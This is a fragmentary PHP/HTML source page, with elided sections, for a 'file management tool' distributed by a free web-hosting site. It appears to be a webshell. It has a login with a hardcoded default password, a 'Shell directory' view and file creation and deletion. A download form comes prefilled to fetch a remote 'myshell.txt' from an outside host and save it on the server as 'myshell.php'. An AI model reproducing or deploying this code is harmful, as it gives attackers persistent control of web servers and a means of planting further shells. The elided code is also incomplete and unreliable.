...
<head>
<meta name="author" content="免费空间,免费PHP空间,免费论坛空间,国外免费空间 免备案空间,美国主机,美国空间" />
<META http-equiv=Page-Enter content="revealTrans(duration=1.0, transition=12)"/>
<!--base onmouseover="window.status='A5免备案的免费空间,支持国内小站的成长 [www.A5dns.com] 为真正用心做站的站长提供空间';return true" /-->
<title>PHP文件管理工具,PHP文件删批量除工具 - A5免费空间  www.A5dns.com 国外免费空间</title>
<style type="text/css">
<!--
* {margin: 0;padding:0;}
...
<?php
$tb->tableheader();
$tb->tdbody('<span style="DISPLAY: block; FILTER: glow(color=#FFFFFF,strength=5); COLOR: blue; HEIGHT: 1px; TEXT-ALIGN: center;border: 1px solid #66ccff;"> ╣ P H P 文件管理工具 ╠ </span> 由A5免费空间提供：A5dns.com');
$tb->tablefooter();
...
$tb->tableheader();
$tb->tdbody('| <a href="?action=logout">注销登录</a> | <a href="?action=dir">Shell 目录</a> | <a href="?action=phpenv">环境变量</a>');
$tb->tablefooter();
...
$tb->tdbody('&nbsp;&nbsp;<input name="Input2" value="新建目录" type="button" title="在当前目录下新建指定目录" onclick=window.location.href="?action=dir&do=createdirectory&newdirectory="+myinput.value>&nbsp;&nbsp;<input name="Input3" value="新建文件" type="button" title="在当前目录下新建指定文件" onclick=window.location.href="?action=editfile&dir='.urlencode($dir).'&newfile="+myinput.value>');
$tb->tablefooter();
...
while ($file=@readdir($dirs)) {
	...
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			...
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"></td>\n";
				echo "</tr>\n";
			}
		}
	}
...
$action = '?action=dir';
	...
	$tb->tdbody('文件位置: '.$tb->makeinput('durl','http://www.GGboy.net/miyabi/myshell.txt','','text','70').'<br>下载到:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','下载','','submit'),'center','1','35');
	echo "</form>";
...
$tb->tableheader();
$tb->tdbody('<span style="DISPLAY: block; FILTER: glow(color=#FFFFFF,strength=5); COLOR: blue; HEIGHT: 1px; TEXT-ALIGN: center;border: 1px solid #66ccff;"><a href=http://www.A5dns.com>免费空间</a>&nbsp;&nbsp;&copy;&nbsp;&nbsp;提供&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;地址:湖北武汉发展大道&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>网址：<a href=http://www.A5dns.com>http://www.A5dns.com</a>');
$tb->tablefooter();
?>
</center>
</body>
...
<form method="POST" action="">
  <tr> 
  <td height="75" align="center"><br>
<span style="font-size: 11px; font-family: Verdana">Password(管理密码): </span><input name="adminpass" type="password" size="20">
<input type="hidden" name="do" value="login">
<input type="submit" value="Login">
<br><br>为确保安全，请先修改本文件的管理密码，<br><br>或使用后删除此程序，默认密码为：<font color=red>A5dns</font><br><br><br>此程序，由 <a href=http://www.A5dns.com>免费空间</a> <a href=http://www.A5dns.com>www.A5dns.com</a> 整理收集！<br><br><br><font color=red>★ 提醒：请看清楚目录后再删除，删除后是无法恢复的。</font></td>
  </tr>
  </form>
<!--此处放入记数器-->
  </table>

<title>PHP文件管理工具,PHP文件删批量除工具- 免费空间,www.A5dns.com,国外免费空间</title>
